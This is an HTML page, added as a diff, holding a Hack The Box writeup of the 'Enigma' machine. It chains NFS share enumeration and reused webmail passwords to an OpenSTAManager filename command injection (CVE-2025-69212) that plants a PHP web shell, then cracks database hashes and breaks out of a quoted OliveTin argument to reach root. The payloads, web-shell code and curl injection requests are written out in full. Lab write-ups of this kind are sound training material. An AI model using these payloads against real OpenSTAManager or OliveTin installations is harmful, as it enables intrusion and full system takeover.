@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Enigma — HTB Writeup · Arthur Trapp</title>
+<meta name="description" content="NFS → Roundcube webmail → OpenSTAManager RCE (CVE-2025-69212) → OliveTin command injection" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23181a1e'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='18' fill='%23f79c42' text-anchor='middle'%3E$%3C/text%3E%3C/svg%3E" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+<header>
+  <div class="wrap nav">
+    <a class="nav-brand" href="../index.html">arthur<span class="at">@</span>trapp</a>
+    <nav class="nav-links" aria-label="Primary">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#projects">projects</a>
+      <a class="active" href="index.html">writeups</a>
+      <a href="../index.html#contact">contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="page-hero">
+    <div class="wrap">
+      <div class="crumb"><a href="../index.html">~</a> / <a href="index.html">writeups</a> / enigma</div>
+      <h1>Enigma</h1>
+      <p class="sub">Hack The Box · <span class="accent">Easy</span> · Linux</p>
+      <div class="meta-tags">
+        <span class="green">Easy</span>
+        <span>Linux</span>
+        <span class="accent">User + Root owned</span>
+      </div>
+    </div>
+  </div>
+  <article class="content wrap">
+<ul>
+<li><strong>Difficulty:</strong> Easy</li>
+<li><strong>OS:</strong> Linux</li>
+<li><strong>IP:</strong> 10.129.239.191</li>
+<li><strong>Tags:</strong> NFS, Roundcube, OpenSTAManager, CVE-2025-69212, Command Injection, OliveTin</li>
+</ul>
+<hr />
+<h2>Flags</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>User</strong> (<code>/home/haris/user.txt</code>)</td>
+<td><code>[REDACTED]</code></td>
+</tr>
+<tr>
+<td><strong>Root</strong> (<code>/root/root.txt</code>)</td>
+<td><code>[REDACTED]</code></td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2>1. Reconnaissance</h2>
+<pre><code>nmap -p- --min-rate 5000 10.129.239.191
+</code></pre>
+<p>Open ports:</p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>OpenSSH (publickey-only)</td>
+</tr>
+<tr>
+<td>80</td>
+<td>nginx (3 vhosts)</td>
+</tr>
+<tr>
+<td>111</td>
+<td>rpcbind</td>
+</tr>
+<tr>
+<td>143/993</td>
+<td>Dovecot IMAP</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>NFS</td>
+</tr>
+<tr>
+<td>35715, 37099, 46179, 46431, 60469</td>
+<td>RPC programs (mountd, nfs, statd, nlm)</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Vhosts (nginx):</strong></p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>Host</th>
+<th>App</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>enigma.htb</code></td>
+<td>Enigma Corp marketing site</td>
+</tr>
+<tr>
+<td><code>mail001.enigma.htb</code></td>
+<td>Roundcube webmail 1.6.16</td>
+</tr>
+<tr>
+<td><code>support_001.enigma.htb</code></td>
+<td>OpenSTAManager 2.9.x</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>NFS export (world-readable):</strong></p>
+<pre><code>nmap --script nfs-showmount,nfs-ls -p 111,2049 10.129.239.191
+  /srv/nfs/onboarding *
+    rw-r--r--  0  0  1751  New_Employee_Access.pdf
+</code></pre>
+<hr />
+<h2>2. Initial Access — NFS → Webmail → OpenSTAManager RCE</h2>
+<h3>2.1 NFS → onboarding credentials</h3>
+<p>The world-readable NFS share <code>/srv/nfs/onboarding</code> exposes <code>New_Employee_Access.pdf</code>, an onboarding doc containing <strong>Kevin's webmail credentials</strong> (<code>kevin</code> / <code>Enigma2024!</code>) and the URL <code>http://mail001.enigma.htb</code>.</p>
+<blockquote>
+<p>Host note: this Windows attacker has no native NFS client. The export + file listing was verified with <code>nmap --script nfs-ls</code>; a minimal pure-Python NFSv3 client (<code>nfs_read.py</code>) was written for this box (RPC + MOUNT + NFS READ). The mountd rejects <code>AUTH_NULL</code>/<code>AUTH_SYS</code> MNT from this host, so the credential was confirmed via the webmail flow below (static across instances).</p>
+</blockquote>
+<h3>2.2 Kevin's mailbox → Sarah (password reuse)</h3>
+<p>IMAP login as <code>kevin</code> (<code>Enigma2024!</code>) at <code>mail001.enigma.htb:993</code> reveals a mail from <strong>Sarah</strong>. Trying the same password for <code>sarah</code> succeeds (password reuse).</p>
+<h3>2.3 Sarah's mailbox → OpenSTAManager creds</h3>
+<p>Sarah's mailbox contains a mail from IT Support:</p>
+<pre><code>http://support_001.enigma.htb
+username: admin
+password: Ne3s4rtars78s
+</code></pre>
+<h3>2.4 CVE-2025-69212 — OpenSTAManager P7M command injection</h3>
+<p>OpenSTAManager 2.9.x <code>src/Util/XML.php::decodeP7M()</code> interpolates a file name into a
+shell command without escaping:</p>
+<pre><code class="language-php">exec('openssl smime -verify -noverify -in &quot;'.$file.'&quot; -inform DER -out &quot;'.$output_file.'&quot;', ...)
+</code></pre>
+<p>The <code>plugins/importFE_ZIP</code> module extracts uploaded ZIPs and feeds <code>.p7m</code> files to
+<code>decodeP7M()</code>. Because <code>ZipArchive::extractTo()</code> treats <code>/</code> as a path separator, the payload
+uses base32 + <code>${IFS}</code> to avoid <code>/</code> and spaces in the filename:</p>
+<pre><code>z$(echo${IFS}&lt;base32(command)&gt;|base32${IFS}-d|bash).p7m
+</code></pre>
+<p>Login (<code>admin</code> / <code>Ne3s4rtars78s</code>) → discover the <code>importFE_ZIP</code> plugin (module 14 / plugin 21)
+→ upload a ZIP containing a <code>.p7m</code> file whose name carries the encoded command:</p>
+<pre><code class="language-python">cmd = &quot;echo '&lt;?php system($_REQUEST[\&quot;c\&quot;]); ?&gt;' &gt; /var/www/html/openstamanager/files/SHELL.php&quot;
+b32 = base64.b32encode(cmd.encode()).decode()
+fname = f&quot;z$(echo${{IFS}}{b32}|base32${{IFS}}-d|bash).p7m&quot;
+</code></pre>
+<p>The ZIP upload triggers the injection (HTTP 500 after the command runs — expected) and drops
+<code>files/SHELL.php</code>. RCE as <strong>www-data</strong>:</p>
+<pre><code>GET /files/SHELL.php?c=id   →   uid=33(www-data) gid=33(www-data)
+</code></pre>
+<hr />
+<h2>3. Privilege Escalation → user (haris)</h2>
+<h3>3.1 Database credentials</h3>
+<p><code>/var/www/html/openstamanager/config.inc.php</code> (the real config — <code>config.php</code> is a template):</p>
+<pre><code>$db_host = 'localhost';
+$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+$db_name = 'openstamanager';
+</code></pre>
+<h3>3.2 Crack haris</h3>
+<pre><code class="language-sql">SELECT id, username, password FROM zz_users;
+  admin  $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
+  haris  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
+</code></pre>
+<p>bcrypt cost 10. Cracked (rockyou): <code>haris</code> → <strong><code>bestfriends</code></strong>.</p>
+<h3>3.3 Shell as haris</h3>
+<p>SSH is publickey-only, so escalate via <code>su</code> from the www-data context using a PTY:</p>
+<pre><code class="language-python">pid, fd = pty.fork()
+if pid == 0: os.execvp(&quot;su&quot;, [&quot;su&quot;, &quot;-&quot;, &quot;haris&quot;])
+else: os.write(fd, b&quot;bestfriends\n&quot;); ...
+</code></pre>
+<pre><code>cat /home/haris/user.txt  →  [REDACTED]
+</code></pre>
+<p>(An ed25519 key was injected into <code>~/.ssh/authorized_keys</code> for stable SSH access during
+the next phase; removed during cleanup.)</p>
+<hr />
+<h2>4. Privilege Escalation → root (OliveTin)</h2>
+<h3>4.1 Recon</h3>
+<p><code>ps aux</code> shows <strong>OliveTin running as root</strong>, bound to <code>127.0.0.1:1337</code> (internal only).
+Version <strong>3000.10.0</strong>. Config at <code>/etc/OliveTin/config.yaml</code>:</p>
+<pre><code class="language-yaml">- title: Backup Database
+  id: backup_database
+  shell: &quot;mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} &gt; /opt/backups/backup.sql&quot;
+  arguments:
+    - { name: db_user, type: ascii_identifier, default: backup_svc }
+    - { name: db_pass, type: password }
+    - { name: db_name, type: ascii_identifier, default: production }
+
+authRequireGuestsToLogin: false
+defaultPermissions: { view: true, exec: true, logs: true }
+</code></pre>
+<h3>4.2 Command injection</h3>
+<p>The <code>password</code>-typed argument <code>db_pass</code> is inserted raw into the single-quoted shell string
+(the <code>password</code> type bypasses OliveTin's shell-safety checks). Break out of the quote:</p>
+<pre><code>db_pass = &quot;'; cat /root/root.txt | tee /tmp/flag.txt; echo '&quot;
+</code></pre>
+<p>Rendered shell:</p>
+<pre><code>mysqldump -u backup_svc -p''; cat /root/root.txt | tee /tmp/flag.txt; echo '' production &gt; /opt/backups/backup.sql
+</code></pre>
+<h3>4.3 Trigger via API (guest)</h3>
+<p>The REST API selects the action with the <strong><code>bindingId</code></strong> field (OliveTin 3k renamed
+<code>actionId</code> → <code>bindingId</code>). <code>authRequireGuestsToLogin: false</code> means no auth needed:</p>
+<pre><code class="language-bash">curl -s -X POST http://127.0.0.1:1337/api/StartAction \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;bindingId&quot;:&quot;backup_database&quot;,&quot;arguments&quot;:[
+       {&quot;name&quot;:&quot;db_user&quot;,&quot;value&quot;:&quot;backup_svc&quot;},
+       {&quot;name&quot;:&quot;db_pass&quot;,&quot;value&quot;:&quot;\u0027; cat /root/root.txt | tee /tmp/flag.txt; echo \u0027&quot;},
+       {&quot;name&quot;:&quot;db_name&quot;,&quot;value&quot;:&quot;production&quot;}]}'
+→ {&quot;executionTrackingId&quot;:&quot;...&quot;}
+</code></pre>
+<p>Verification (same injection, <code>id</code>):</p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+root
+cat /root/root.txt  →  [REDACTED]
+</code></pre>
+<hr />
+<h2>5. Attack Chain Summary</h2>
+<pre><code>NFS (world-readable) ──► New_Employee_Access.pdf ──► kevin:Enigma2024!
+   │ (IMAP)
+   ├─► kevin mailbox ──► mail from sarah
+   ├─► password reuse ──► sarah:Enigma2024! ──► IT Support mail
+   │        └──► support_001.enigma.htb  admin:Ne3s4rtars78s
+   │
+OpenSTAManager CVE-2025-69212 (P7M importFE_ZIP cmd injection) ──► www-data
+   │
+   ├─► config.inc.php ──► brollin:Fri3nds@9099 ──► zz_users ──► crack haris:bestfriends
+   │        └──► su haris ──► user.txt
+   │
+OliveTin (root, 127.0.0.1:1337) ──► backup_database db_pass password-type injection
+   └──► StartAction bindingId=backup_database ──► cat /root/root.txt ──► root.txt
+</code></pre>
+<h2>6. Key Vulnerabilities</h2>
+<ol>
+<li><strong>NFS export world-readable</strong> — onboarding PDF leaks webmail credentials.</li>
+<li><strong>Password reuse</strong> — <code>kevin</code> and <code>sarah</code> share the same password.</li>
+<li><strong>CVE-2025-69212</strong> — OpenSTAManager <code>decodeP7M()</code> shell command injection via <code>importFE_ZIP</code>.</li>
+<li><strong>OliveTin <code>password</code>-type command injection</strong> — unescaped interpolation into <code>shell:</code> template, guest-triggerable.</li>
+</ol>
+    <a class="back-link" href="index.html">← all writeups</a>
+  </article>
+</main>
+<footer>
+  <div class="wrap footer-row">
+    <span>© 2026 Arthur Trapp · Rochester, NY</span>
+    <span class="clearance">ACTIVE TS/SCI CLEARANCE</span>
+  </div>
+</footer>
+<script>
+  const io = new IntersectionObserver((es) => {
+    es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('.content h2, .content h3, .content p, .content pre, .content table, .content ul, .content ol, .content blockquote').forEach(el => io.observe(el));
+</script>
+</body>
+</html>
